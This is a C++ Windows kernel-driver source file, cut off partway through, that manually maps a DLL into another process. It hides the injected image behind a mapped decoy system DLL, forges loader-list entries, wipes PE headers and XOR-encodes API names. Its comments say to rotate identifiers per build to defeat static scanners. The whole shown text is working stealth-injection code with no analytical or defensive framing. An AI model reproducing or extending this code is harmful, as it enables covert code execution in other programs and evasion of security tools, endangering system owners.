#include <ntifs.h>
#include <ntimage.h>
#include <ntstrsafe.h>

extern "C" NTSTATUS ZwProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);

extern "C" NTKERNELAPI POBJECT_TYPE *MmSectionObjectType;

extern "C" NTKERNELAPI NTSTATUS ZwGetNextThread(
    _In_     HANDLE ProcessHandle,
    _In_opt_ HANDLE ThreadHandle,
    _In_     ACCESS_MASK DesiredAccess,
    _In_     ULONG HandleAttributes,
    _In_     ULONG Flags,
    _Out_    PHANDLE NewThreadHandle);

extern "C" NTKERNELAPI BOOLEAN KeAlertThread(
    _In_ PKTHREAD Thread,
    _In_ KPROCESSOR_MODE AlertMode);

extern "C" NTKERNELAPI PPEB PsGetProcessPeb(PEPROCESS Process);

#ifndef _RUNTIME_FUNCTION_DEFINED
typedef struct _RUNTIME_FUNCTION {
    ULONG BeginAddress;
    ULONG EndAddress;
    ULONG UnwindData;
} RUNTIME_FUNCTION;
#define _RUNTIME_FUNCTION_DEFINED
#endif

typedef enum _KAPC_ENVIRONMENT_CUSTOM {
    OriginalApcEnvironment,
    AttachedApcEnvironment,
    CurrentApcEnvironment,
    InsertApcEnvironment
} KAPC_ENVIRONMENT_CUSTOM;

extern "C" NTKERNELAPI VOID KeInitializeApc(
    PRKAPC Apc, PRKTHREAD Thread, KAPC_ENVIRONMENT_CUSTOM Environment,
    PVOID KernelRoutine, PVOID RundownRoutine, PVOID NormalRoutine,
    KPROCESSOR_MODE ApcMode, PVOID NormalContext);

extern "C" NTKERNELAPI BOOLEAN KeInsertQueueApc(
    PRKAPC Apc, PVOID SystemArgument1, PVOID SystemArgument2,
    KPRIORITY Increment);

typedef struct _PEB_LDR_DATA2 {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA2, *PPEB_LDR_DATA2;

typedef struct _LDR_DATA_TABLE_ENTRY2 {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    ULONG          CheckSum;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG          Flags;
    USHORT         ObsoleteLoadCount;
    USHORT         TlsIndex;
    LIST_ENTRY     HashLinks;
    ULONG          TimeDateStamp;
} LDR_DATA_TABLE_ENTRY2, *PLDR_DATA_TABLE_ENTRY2;

typedef struct _PEB2 {
    UCHAR          Reserved1[2];
    UCHAR          BeingDebugged;
    UCHAR          Reserved2[1];
    PVOID          Reserved3[2];
    PPEB_LDR_DATA2 Ldr;
} PEB2, *PPEB2;

// NOTE: rotate POOL_TAG per build (fresh 4 chars) to defeat static scanners.
#define POOL_TAG 'GfxC'

extern "C" NTKERNELAPI NTSTATUS MmCopyVirtualMemory(
    PEPROCESS SourceProcess,
    PVOID     SourceAddress,
    PEPROCESS TargetProcess,
    PVOID     TargetAddress,
    SIZE_T    BufferSize,
    KPROCESSOR_MODE PreviousMode,
    PSIZE_T   ReturnSize);

extern "C" NTKERNELAPI PEPROCESS PsInitialSystemProcess;
// NOTE: rotate REG_KEY_PATH per build; must match loader.cpp counterpart.
#define REG_KEY_PATH L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Cache"

static void XorDecodeStr(char* dst, const char* enc, SIZE_T len) {
    for (SIZE_T i = 0; i < len; i++) dst[i] = enc[i] ^ 0x5A;
    dst[len] = 0;
}
#define DECODE(name, enc) char name[sizeof(enc) + 1]; XorDecodeStr(name, enc, sizeof(enc))

// XOR key 0x5A. Verified byte-for-byte.
// "KERNEL32.DLL"
static const char ENC_K32[]     = { (char)0x11,(char)0x1F,(char)0x08,(char)0x14,(char)0x1F,(char)0x16,(char)0x69,(char)0x68,(char)0x74,(char)0x1E,(char)0x16,(char)0x16 };
// "ntdll.dll"
static const char ENC_NTDLL[]   = { (char)0x34,(char)0x2E,(char)0x3E,(char)0x36,(char)0x36,(char)0x74,(char)0x3E,(char)0x36,(char)0x36 };
// "LoadLibraryA"
static const char ENC_LOADLIB[] = { (char)0x16,(char)0x35,(char)0x3B,(char)0x3E,(char)0x16,(char)0x33,(char)0x38,(char)0x28,(char)0x3B,(char)0x28,(char)0x23,(char)0x1B };
// "GetProcAddress"
static const char ENC_GETPROC[] = { (char)0x1D,(char)0x3F,(char)0x2E,(char)0x0A,(char)0x28,(char)0x35,(char)0x39,(char)0x1B,(char)0x3E,(char)0x3E,(char)0x28,(char)0x3F,(char)0x29,(char)0x29 };
// "RtlAddFunctionTable"
static const char ENC_RTLADD[]  = { (char)0x08,(char)0x2E,(char)0x36,(char)0x1B,(char)0x3E,(char)0x3E,(char)0x1C,(char)0x2F,(char)0x34,(char)0x39,(char)0x2E,(char)0x33,(char)0x35,(char)0x34,(char)0x0E,(char)0x3B,(char)0x38,(char)0x36,(char)0x3F };

struct InjectionDiag {
    ULONG64 DllBase;
    ULONG64 ShellcodeAddr;
    ULONG64 LoadLibAddr;
    ULONG64 GetProcAddr;
    ULONG64 RtlAddFuncTableAddr;
    ULONG64 DataPageAddr;
    LONG    Status;
    LONG    ProtectStatus;
    ULONG   ImageSize;
    ULONG   EntryPointRva;
    ULONG   MissingModCount;
    ULONG   UnresolvedCount;
    ULONG   TotalThreads;
    ULONG   ApcCount;
    ULONG   ShellcodeSize;
    ULONG   ExceptionEntries;
    UCHAR   ProgressMarker;
    UCHAR   ProcessAlive;
    UCHAR   pad[6];
    char    MissingMod[8][64];
};

static PVOID g_ExFreePool = nullptr;
static PVOID g_PoolCopy   = nullptr;
static LONG  g_StopWorker = 0;

extern "C" IMAGE_DOS_HEADER __ImageBase;
extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT, PUNICODE_STRING);

static NTSTATUS SafeWrite(PVOID destVA, const VOID* src, SIZE_T size) {
    PEPROCESS target = PsGetCurrentProcess();
    SIZE_T written = 0;
    return MmCopyVirtualMemory(
        PsInitialSystemProcess, const_cast<PVOID>(src),
        target, destVA,
        size, KernelMode, &written);
}

static NTSTATUS AddLdrEntry(PEPROCESS targetProcess, PVOID dllBase, PVOID entryPoint,
                             ULONG imageSize, const WCHAR* fullPath, ULONG timeDateStamp) {
    if (fullPath[0] == L'\\' && fullPath[1] == L'?' && fullPath[2] == L'?' && fullPath[3] == L'\\')
        fullPath += 4;
    else if (fullPath[0] == L'\\' && fullPath[1] == L'\\' && fullPath[2] == L'?' && fullPath[3] == L'\\')
        fullPath += 4;

    SIZE_T fullPathLen = 0;
    while (fullPath[fullPathLen]) fullPathLen++;

    SIZE_T baseStart = 0;
    for (SIZE_T i = 0; i < fullPathLen; i++)
        if (fullPath[i] == L'\\' || fullPath[i] == L'/') baseStart = i + 1;
    const WCHAR* baseName = fullPath + baseStart;
    SIZE_T baseNameLen = fullPathLen - baseStart;

    USHORT fullBytes = (USHORT)(fullPathLen * sizeof(WCHAR));
    USHORT baseBytes = (USHORT)(baseNameLen * sizeof(WCHAR));

    SIZE_T entrySize  = sizeof(LDR_DATA_TABLE_ENTRY2);
    SIZE_T fullSz     = fullBytes + sizeof(WCHAR);
    SIZE_T baseSz     = baseBytes + sizeof(WCHAR);
    SIZE_T totalSize  = ((entrySize + fullSz + baseSz) + 15) & ~15ULL;

    auto* kbuf = static_cast<PUCHAR>(ExAllocatePool2(POOL_FLAG_NON_PAGED, totalSize, POOL_TAG));
    if (!kbuf) return STATUS_INSUFFICIENT_RESOURCES;
    RtlZeroMemory(kbuf, totalSize);

    KAPC_STATE apcState;
    KeStackAttachProcess(targetProcess, &apcState);

    PPEB2 peb = reinterpret_cast<PPEB2>(PsGetProcessPeb(targetProcess));
    if (!peb || !peb->Ldr) {
        KeUnstackDetachProcess(&apcState);
        ExFreePoolWithTag(kbuf, POOL_TAG);
        return STATUS_UNSUCCESSFUL;
    }

    PVOID entryMem = nullptr;
    SIZE_T allocSize = totalSize;
    NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &entryMem, 0, &allocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        KeUnstackDetachProcess(&apcState);
        ExFreePoolWithTag(kbuf, POOL_TAG);
        return status;
    }

    PUCHAR entryBase      = static_cast<PUCHAR>(entryMem);
    PWCHAR fullPathTarget = reinterpret_cast<PWCHAR>(entryBase + entrySize);
    PWCHAR baseNameTarget = reinterpret_cast<PWCHAR>(entryBase + entrySize + fullSz);

    auto*  entry   = reinterpret_cast<PLDR_DATA_TABLE_ENTRY2>(kbuf);
    PWCHAR kFull   = reinterpret_cast<PWCHAR>(kbuf + entrySize);
    PWCHAR kBase   = reinterpret_cast<PWCHAR>(kbuf + entrySize + fullSz);

    for (SIZE_T i = 0; i <= fullPathLen; i++) kFull[i] = fullPath[i];
    for (SIZE_T i = 0; i <= baseNameLen; i++) kBase[i] = baseName[i];

    entry->DllBase             = dllBase;
    entry->EntryPoint          = entryPoint;
    entry->SizeOfImage         = imageSize;
    entry->CheckSum            = 0;
    entry->Flags               = 0x00084004;
    entry->ObsoleteLoadCount   = 1;
    entry->TlsIndex            = 0;
    entry->TimeDateStamp       = timeDateStamp;

    entry->FullDllName.Buffer        = fullPathTarget;
    entry->FullDllName.Length        = fullBytes;
    entry->FullDllName.MaximumLength = (USHORT)fullSz;

    entry->BaseDllName.Buffer        = baseNameTarget;
    entry->BaseDllName.Length        = baseBytes;
    entry->BaseDllName.MaximumLength = (USHORT)baseSz;

    PPEB_LDR_DATA2 ldr      = peb->Ldr;
    PLIST_ENTRY    loadHead = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY    memHead  = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY    initHead = &ldr->InInitializationOrderModuleList;
    PLIST_ENTRY    loadTail = nullptr, memTail = nullptr, initTail = nullptr;
    if (!MmIsAddressValid(loadHead) || !MmIsAddressValid(memHead) || !MmIsAddressValid(initHead)) {
        ZwFreeVirtualMemory(ZwCurrentProcess(), &entryMem, &allocSize, MEM_RELEASE);
        KeUnstackDetachProcess(&apcState);
        ExFreePoolWithTag(kbuf, POOL_TAG);
        return STATUS_ACCESS_VIOLATION;
    }
    loadTail = loadHead->Blink;
    memTail  = memHead->Blink;
    initTail = initHead->Blink;

    PLIST_ENTRY newLoad = reinterpret_cast<PLIST_ENTRY>(entryBase + FIELD_OFFSET(LDR_DATA_TABLE_ENTRY2, InLoadOrderLinks));
    PLIST_ENTRY newMem  = reinterpret_cast<PLIST_ENTRY>(entryBase + FIELD_OFFSET(LDR_DATA_TABLE_ENTRY2, InMemoryOrderLinks));
    PLIST_ENTRY newInit = reinterpret_cast<PLIST_ENTRY>(entryBase + FIELD_OFFSET(LDR_DATA_TABLE_ENTRY2, InInitializationOrderLinks));
    PLIST_ENTRY newHash = reinterpret_cast<PLIST_ENTRY>(entryBase + FIELD_OFFSET(LDR_DATA_TABLE_ENTRY2, HashLinks));

    entry->InLoadOrderLinks.Flink          = loadHead;
    entry->InLoadOrderLinks.Blink          = loadTail;
    entry->InMemoryOrderLinks.Flink        = memHead;
    entry->InMemoryOrderLinks.Blink        = memTail;
    entry->InInitializationOrderLinks.Flink = initHead;
    entry->InInitializationOrderLinks.Blink = initTail;
    entry->HashLinks.Flink                 = newHash;
    entry->HashLinks.Blink                 = newHash;

    status = SafeWrite(entryMem, kbuf, totalSize);
    ExFreePoolWithTag(kbuf, POOL_TAG);

    if (!NT_SUCCESS(status)) {
        ZwFreeVirtualMemory(ZwCurrentProcess(), &entryMem, &allocSize, MEM_RELEASE);
        KeUnstackDetachProcess(&apcState);
        return status;
    }

    SafeWrite(&loadTail->Flink, &newLoad, sizeof(PLIST_ENTRY));
    SafeWrite(&loadHead->Blink, &newLoad, sizeof(PLIST_ENTRY));
    SafeWrite(&memTail->Flink,  &newMem,  sizeof(PLIST_ENTRY));
    SafeWrite(&memHead->Blink,  &newMem,  sizeof(PLIST_ENTRY));
    SafeWrite(&initTail->Flink, &newInit, sizeof(PLIST_ENTRY));
    SafeWrite(&initHead->Blink, &newInit, sizeof(PLIST_ENTRY));

    KeUnstackDetachProcess(&apcState);
    return STATUS_SUCCESS;
}

// --- Import resolution ---

static char UpperAscii(char c) {
    return (c >= 'a' && c <= 'z') ? (char)(c - 32) : c;
}

static bool AsciiMatchWide(const char* ascii, const WCHAR* wide, USHORT byteLen) {
    USHORT wchars = byteLen / sizeof(WCHAR);
    SIZE_T i = 0;
    for (; i < wchars && ascii[i]; i++) {
        if (UpperAscii(ascii[i]) != (char)RtlUpcaseUnicodeChar(wide[i]))
            return false;
    }
    return i == wchars && !ascii[i];
}

static PVOID FindModInPeb(PPEB_LDR_DATA2 ldr, const char* name) {
    for (auto* e = ldr->InLoadOrderModuleList.Flink;
         e != &ldr->InLoadOrderModuleList; e = e->Flink) {
        auto* m = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY2, InLoadOrderLinks);
        if (!m->DllBase) continue;
        if (AsciiMatchWide(name, m->BaseDllName.Buffer, m->BaseDllName.Length))
            return m->DllBase;
    }
    return nullptr;
}

static PVOID GetExportByName(PVOID base, const char* name, PPEB_LDR_DATA2 ldr = nullptr, int depth = 0);
static PVOID GetExportByOrdinal(PVOID base, USHORT ordinal, PPEB_LDR_DATA2 ldr = nullptr, int depth = 0);

static PVOID ResolveForward(const char* fwd, PPEB_LDR_DATA2 ldr, int depth) {
    if (!ldr || depth > 5) return nullptr;
    char modName[140] = {};
    int dotPos = -1;
    for (int k = 0; fwd[k] && k < 130; k++) {
        if (fwd[k] == '.') { dotPos = k; break; }
        modName[k] = fwd[k];
    }
    if (dotPos < 0) return nullptr;
    const char* funcName = fwd + dotPos + 1;

    char modDll[150] = {};
    int len = 0;
    while (modName[len]) { modDll[len] = modName[len]; len++; }
    modDll[len] = '.'; modDll[len+1] = 'd'; modDll[len+2] = 'l'; modDll[len+3] = 'l'; modDll[len+4] = 0;

    PVOID mod = FindModInPeb(ldr, modDll);
    if (!mod) mod = FindModInPeb(ldr, modName);

    if (!mod) {
        const char* fallbacks[] = {
            "kernelbase.dll", "ntdll.dll", "kernel32.dll",
            "user32.dll", "win32u.dll", "gdi32.dll"
        };
        for (int i = 0; i < 6; i++) {
            PVOID fb = FindModInPeb(ldr, fallbacks[i]);
            if (!fb) continue;
            PVOID result = nullptr;
            if (funcName[0] == '#') {
                USHORT ord = 0;
                for (int k = 1; funcName[k] >= '0' && funcName[k] <= '9'; k++)
                    ord = ord * 10 + (funcName[k] - '0');
                result = GetExportByOrdinal(fb, ord, ldr, depth + 1);
            } else {
                result = GetExportByName(fb, funcName, ldr, depth + 1);
            }
            if (result) return result;
        }
        return nullptr;
    }

    if (funcName[0] == '#') {
        USHORT ord = 0;
        for (int k = 1; funcName[k] >= '0' && funcName[k] <= '9'; k++)
            ord = ord * 10 + (funcName[k] - '0');
        return GetExportByOrdinal(mod, ord, ldr, depth + 1);
    }
    return GetExportByName(mod, funcName, ldr, depth + 1);
}

static PVOID GetExportByName(PVOID base, const char* name, PPEB_LDR_DATA2 ldr, int depth) {
    if (depth > 5) return nullptr;
    auto* dos = static_cast<PIMAGE_DOS_HEADER>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    auto* nt    = reinterpret_cast<PIMAGE_NT_HEADERS>(static_cast<PUCHAR>(base) + dos->e_lfanew);
    auto& ed    = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!ed.Size) return nullptr;
    auto* exp   = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(static_cast<PUCHAR>(base) + ed.VirtualAddress);
    auto* names = reinterpret_cast<PULONG>(static_cast<PUCHAR>(base) + exp->AddressOfNames);
    auto* ords  = reinterpret_cast<PUSHORT>(static_cast<PUCHAR>(base) + exp->AddressOfNameOrdinals);
    auto* funcs = reinterpret_cast<PULONG>(static_cast<PUCHAR>(base) + exp->AddressOfFunctions);
    for (ULONG i = 0; i < exp->NumberOfNames; i++) {
        const char* n = reinterpret_cast<const char*>(static_cast<PUCHAR>(base) + names[i]);
        bool eq = true;
        for (SIZE_T j = 0; ; j++) {
            if (n[j] != name[j]) { eq = false; break; }
            if (!n[j]) break;
        }
        if (!eq) continue;
        ULONG rva = funcs[ords[i]];
        if (rva >= ed.VirtualAddress && rva < ed.VirtualAddress + ed.Size)
            return ResolveForward(reinterpret_cast<const char*>(static_cast<PUCHAR>(base) + rva), ldr, depth);
        return static_cast<PUCHAR>(base) + rva;
    }
    return nullptr;
}

static PVOID GetExportByOrdinal(PVOID base, USHORT ordinal, PPEB_LDR_DATA2 ldr, int depth) {
    if (depth > 5) return nullptr;
    auto* dos   = static_cast<PIMAGE_DOS_HEADER>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    auto* nt    = reinterpret_cast<PIMAGE_NT_HEADERS>(static_cast<PUCHAR>(base) + dos->e_lfanew);
    auto& ed    = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!ed.Size) return nullptr;
    auto* exp   = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(static_cast<PUCHAR>(base) + ed.VirtualAddress);
    auto* funcs = reinterpret_cast<PULONG>(static_cast<PUCHAR>(base) + exp->AddressOfFunctions);
    ULONG idx   = (ULONG)ordinal - exp->Base;
    if (idx >= exp->NumberOfFunctions) return nullptr;
    ULONG rva = funcs[idx];
    if (rva >= ed.VirtualAddress && rva < ed.VirtualAddress + ed.Size)
        return ResolveForward(reinterpret_cast<const char*>(static_cast<PUCHAR>(base) + rva), ldr, depth);
    return static_cast<PUCHAR>(base) + funcs[idx];
}

struct UnresolvedEntry {
    PVOID  iatSlotAddr;
    char   funcName[128];
    USHORT ordinal;
    UCHAR  byOrdinal;
    UCHAR  pad;
    ULONG  moduleIndex;
};

static void ResolveImports(PUCHAR dllData, PVOID remoteBase, PPEB_LDR_DATA2 ldr,
                           char missingMods[][64], ULONG* missingCount, ULONG maxMissing,
                           UnresolvedEntry* unresolved, ULONG* unresolvedCount, ULONG maxUnresolved) {
    *missingCount = 0;
    *unresolvedCount = 0;
    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(dllData);
    auto* nt  = reinterpret_cast<PIMAGE_NT_HEADERS>(dllData + dos->e_lfanew);
    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dir.Size) return;

    auto* desc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(dllData + dir.VirtualAddress);
    for (; desc->Name; desc++) {
        const char* modName = reinterpret_cast<const char*>(dllData + desc->Name);
        PVOID modBase = FindModInPeb(ldr, modName);
        if (!modBase) {
            ULONG modIdx = *missingCount;
            bool alreadyRecorded = false;
            for (ULONG j = 0; j < *missingCount; j++) {
                bool match = true;
                for (int k = 0; ; k++) {
                    char a = missingMods[j][k]; if (a >= 'a' && a <= 'z') a -= 32;
                    char b = modName[k];        if (b >= 'a' && b <= 'z') b -= 32;
                    if (a != b) { match = false; break; }
                    if (!a) break;
                }
                if (match) { modIdx = j; alreadyRecorded = true; break; }
            }
            if (!alreadyRecorded && *missingCount < maxMissing) {
                SIZE_T i = 0;
                while (modName[i] && i < 63) { missingMods[*missingCount][i] = modName[i]; i++; }
                missingMods[*missingCount][i] = 0;
                modIdx = *missingCount;
                (*missingCount)++;
            }

            auto* origThunk2 = reinterpret_cast<PIMAGE_THUNK_DATA>(
                desc->OriginalFirstThunk ? dllData + desc->OriginalFirstThunk
                                         : dllData + desc->FirstThunk);
            auto* iatSlot2 = reinterpret_cast<PVOID*>(
                reinterpret_cast<PUCHAR>(remoteBase) + desc->FirstThunk);
            for (; origThunk2->u1.AddressOfData; origThunk2++, iatSlot2++) {
                if (*unresolvedCount >= maxUnresolved) break;
                auto& ue = unresolved[*unresolvedCount];
                ue.iatSlotAddr = iatSlot2;
                ue.moduleIndex = modIdx;
                ue.pad = 0;
                if (IMAGE_SNAP_BY_ORDINAL(origThunk2->u1.Ordinal)) {
                    ue.byOrdinal = 1;
                    ue.ordinal = IMAGE_ORDINAL(origThunk2->u1.Ordinal);
                    ue.funcName[0] = 0;
                } else {
                    ue.byOrdinal = 0;
                    ue.ordinal = 0;
                    auto* ibn = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                        dllData + origThunk2->u1.AddressOfData);
                    SIZE_T k = 0;
                    while (ibn->Name[k] && k < 127) { ue.funcName[k] = ibn->Name[k]; k++; }
                    ue.funcName[k] = 0;
                }
                (*unresolvedCount)++;
            }
            continue;
        }

        auto* origThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(
            desc->OriginalFirstThunk ? dllData + desc->OriginalFirstThunk
                                     : dllData + desc->FirstThunk);
        auto* iatSlot = reinterpret_cast<PVOID*>(dllData + desc->FirstThunk);

        for (; origThunk->u1.AddressOfData; origThunk++, iatSlot++) {
            PVOID fn;
            if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                fn = GetExportByOrdinal(modBase, IMAGE_ORDINAL(origThunk->u1.Ordinal), ldr);
            } else {
                auto* ibn = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                    dllData + origThunk->u1.AddressOfData);
                fn = GetExportByName(modBase, ibn->Name, ldr);
            }
            if (fn) {
                *iatSlot = fn;
            }
        }
    }
}

static HANDLE OpenDecoyFile(SIZE_T requiredSize) {
    const WCHAR* decoys[] = {
        L"\\SystemRoot\\System32\\dbghelp.dll",
        L"\\SystemRoot\\System32\\urlmon.dll",
        L"\\SystemRoot\\System32\\msxml6.dll",
        L"\\SystemRoot\\System32\\mfplat.dll",
    };
    for (int d = 0; d < 4; d++) {
        UNICODE_STRING path;
        RtlInitUnicodeString(&path, decoys[d]);
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &path, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);
        IO_STATUS_BLOCK ios;
        HANDLE fh;
        NTSTATUS st = ZwCreateFile(&fh, GENERIC_READ, &oa, &ios, nullptr,
            FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT, nullptr, 0);
        if (!NT_SUCCESS(st)) continue;
        FILE_STANDARD_INFORMATION fi;
        st = ZwQueryInformationFile(fh, &ios, &fi, sizeof(fi), FileStandardInformation);
        if (NT_SUCCESS(st) && static_cast<SIZE_T>(fi.EndOfFile.QuadPart) >= requiredSize) {
            return fh;
        }
        ZwClose(fh);
    }
    return nullptr;
}

static NTSTATUS InjectDll(PEPROCESS targetProcess, PUCHAR dllData, SIZE_T dllSize,
                          InjectionDiag* diag) {
    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(dllData);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return STATUS_INVALID_IMAGE_FORMAT;
    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(dllData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return STATUS_INVALID_IMAGE_FORMAT;

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;

    auto* mappedImage = static_cast<PUCHAR>(
        ExAllocatePool2(POOL_FLAG_NON_PAGED, imageSize, POOL_TAG));
    if (!mappedImage) return STATUS_INSUFFICIENT_RESOURCES;
    RtlZeroMemory(mappedImage, imageSize);

    RtlCopyMemory(mappedImage, dllData, nt->OptionalHeader.SizeOfHeaders);
    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!sec[i].SizeOfRawData) continue;
        if (sec[i].PointerToRawData + sec[i].SizeOfRawData > dllSize) continue;
        RtlCopyMemory(mappedImage + sec[i].VirtualAddress,
                       dllData + sec[i].PointerToRawData, sec[i].SizeOfRawData);
    }

    auto* mappedDos = reinterpret_cast<PIMAGE_DOS_HEADER>(mappedImage);
    auto* mappedNt  = reinterpret_cast<PIMAGE_NT_HEADERS>(mappedImage + mappedDos->e_lfanew);

    HANDLE decoyFile = OpenDecoyFile(imageSize);
    if (!decoyFile) {
        ExFreePoolWithTag(mappedImage, POOL_TAG);
        return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    HANDLE hDecoySection = nullptr;
    OBJECT_ATTRIBUTES secOa;
    InitializeObjectAttributes(&secOa, nullptr, OBJ_KERNEL_HANDLE, nullptr, nullptr);
    NTSTATUS status = ZwCreateSection(&hDecoySection, SECTION_ALL_ACCESS, &secOa, nullptr,
                                       PAGE_EXECUTE, SEC_IMAGE, decoyFile);
    ZwClose(decoyFile);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(mappedImage, POOL_TAG);
        return status;
    }

    KAPC_STATE apcState;
    KeStackAttachProcess(targetProcess, &apcState);

    PVOID remoteBase = nullptr;
    SIZE_T viewSize = 0;
    status = ZwMapViewOfSection(hDecoySection, ZwCurrentProcess(), &remoteBase, 0, 0,
                                 nullptr, &viewSize, ViewUnmap, 0, PAGE_READONLY);
    ZwClose(hDecoySection);
    if (!NT_SUCCESS(status)) {
        KeUnstackDetachProcess(&apcState);
        ExFreePoolWithTag(mappedImage, POOL_TAG);
        return status;
    }

    ULONG_PTR delta = reinterpret_cast<ULONG_PTR>(remoteBase)
                    - static_cast<ULONG_PTR>(mappedNt->OptionalHeader.ImageBase);
    if (delta && mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        auto* reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
            mappedImage + mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->VirtualAddress && reloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
            auto* info  = reinterpret_cast<PUSHORT>(reloc + 1);
            ULONG count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
            for (ULONG i = 0; i < count; i++) {
                ULONG type = info[i] >> 12;
                ULONG roff = info[i] & 0xFFF;
                ULONG_PTR patchOffset = reloc->VirtualAddress + roff;
                if (patchOffset + 8 > imageSize) continue;
                if (type == IMAGE_REL_BASED_DIR64) {
                    *reinterpret_cast<PULONG_PTR>(mappedImage + patchOffset) += delta;
                } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    *reinterpret_cast<PULONG>(mappedImage + patchOffset) += static_cast<ULONG>(delta);
                }
            }
            reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
                reinterpret_cast<PUCHAR>(reloc) + reloc->SizeOfBlock);
        }
    }

    char missingMods[32][64] = {};
    ULONG missingCount = 0;
    ULONG unresolvedCount = 0;
    auto* unresolvedBuf = static_cast<UnresolvedEntry*>(
        ExAllocatePool2(POOL_FLAG_NON_PAGED, 512 * sizeof(UnresolvedEntry), POOL_TAG));
    auto* peb = reinterpret_cast<PPEB2>(PsGetProcessPeb(targetProcess));
    if (peb && peb->Ldr) {
        if (unresolvedBuf)
            ResolveImports(mappedImage, reinterpret_cast<PUCHAR>(remoteBase), peb->Ldr,
                           missingMods, &missingCount, 32,
                           unresolvedBuf, &unresolvedCount, 512);
        else {
            ULONG dummy = 0;
            ResolveImports(mappedImage, reinterpret_cast<PUCHAR>(remoteBase), peb->Ldr,
                           missingMods, &missingCount, 32,
                           nullptr, &dummy, 0);
        }
    }

    RtlZeroMemory(mappedImage, nt->OptionalHeader.SizeOfHeaders);

    {
        PVOID hdrBase = remoteBase;
        SIZE_T hdrSize = nt->OptionalHeader.SizeOfHeaders;
        ULONG hdrOld;
        ZwProtectVirtualMemory(ZwCurrentProcess(), &hdrBase, &hdrSize, PAGE_READWRITE, &hdrOld);
    }
    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        PVOID  secBase2 = reinterpret_cast<PVOID>(reinterpret_cast<PUCHAR>(remoteBase) + sec[i].VirtualAddress);
        SIZE_T secSz2   = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        if (secSz2 == 0) continue;
        ULONG old2;
        ZwProtectVirtualMemory(ZwCurrentProcess(), &secBase2, &secSz2, PAGE_READWRITE, &old2);
    }

    status = SafeWrite(remoteBase, mappedImage, imageSize);
    if (!NT_SUCCESS(status)) {
        if (unresolvedBuf) ExFreePoolWithTag(unresolvedBuf, POOL_TAG);
        ZwUnmapViewOfSection(ZwCurrentProcess(), remoteBase);
        KeUnstackDetachProcess(&apcState);
        ExFreePoolWithTag(mappedImage, POOL_TAG);
        return status;
    }

    ULONG excDirRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    ULONG excDirSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
    ULONG exceptionEntries = 0;
    PVOID exceptionDirAddr = nullptr;
    if (excDirSize > 0 && excDirRva > 0) {
        exceptionEntries = excDirSize / sizeof(RUNTIME_FUNCTION);
        exceptionDirAddr = reinterpret_cast<PVOID>(
            reinterpret_cast<PUCHAR>(remoteBase) + excDirRva);
    }

    ExFreePoolWithTag(mappedImage, POOL_TAG);

    NTSTATUS protStatus = STATUS_SUCCESS;
    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        ULONG prot = PAGE_READWRITE;
        ULONG ch = sec[i].Characteristics;
